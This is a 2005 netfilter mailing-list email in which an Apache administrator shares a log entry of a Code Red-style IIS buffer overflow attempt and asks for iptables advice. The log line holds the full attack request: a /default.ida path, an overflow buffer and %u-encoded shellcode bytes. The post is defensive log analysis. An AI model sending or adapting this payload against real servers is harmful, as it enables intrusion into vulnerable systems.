From: Brent Clark <bclark@eccotours.dyndns.org>
Subject: default.ida?X
Date: Fri, 03 Jun 2005 09:56:00 +0200
Message-ID: <42A00D10.4030705@eccotours.dyndns.org>
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <netfilter-bounces@lists.netfilter.org>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: </pipermail/netfilter>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
Sender: netfilter-bounces@lists.netfilter.org
Errors-To: netfilter-bounces@lists.netfilter.org
Content-Type: text/plain; charset="us-ascii"; format="flowed"
To: iptables <netfilter@lists.netfilter.org>

Hi list

Its days like this I get so excited and I know that Im going to learn 
something more about security.

This morning in my apache logs I saw this.

61.185.21.74 - - [02/Jun/2005:16:58:31 +0200] "GET 
/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a 
HTTP/1.0" 403 286 "-" "-" "-"

My google shows its an IIS exploit.
(http://www.thesitewizard.com/news/coderediiworm.shtml)
I like the part that says:
If your website is on a (say) Unix or Linux system, running the Apache 
web server, your server is probably safe, since the worm actually 
exploits vulnerabilities in the IIS server that are not present in 
Apache. However, don't relax just yet.

Anyway I  dont run IIS

But just in case of security and future tips / advice for using iptables.

If anyone has anything to share, it would be most appreciated.

Kind Regards
Brent Clark



